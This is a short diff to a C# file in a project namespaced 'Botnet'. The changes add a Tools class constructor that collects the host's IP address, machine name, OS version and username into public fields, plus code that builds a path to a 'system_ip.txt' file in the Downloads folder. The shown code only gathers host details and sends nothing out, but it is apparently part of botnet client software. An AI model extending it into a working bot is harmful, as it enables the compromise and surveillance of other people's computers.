@@ -1,15 +1,29 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
+using System.Management;
 
 namespace Botnet
 {
     class Tools
     {
-        Tools()
+
+        public string ip = "";
+        public string machine_name = "";
+        public string os = "";
+        public string user_session = "";
+
+        public Tools()
         {
+            ip = GetIp();
+            machine_name = System.Environment.MachineName.ToString();
+            os = Environment.OSVersion.ToString();
+            user_session = Environment.UserName.ToString();
+            
             
         }
 
@@ -35,7 +49,7 @@ namespace Botnet
             string PCUsername = Environment.UserName;
             string chemin = "C:/users/" + PCUsername + "/Downloads/system_ip.txt";
 
-            IPHostEntry Host = default(IPHostEntry);
+            System.Net.IPHostEntry Host = default(IPHostEntry);
             string Hostname = null;
             Hostname = System.Environment.MachineName;
             Host = Dns.GetHostEntry(Hostname);
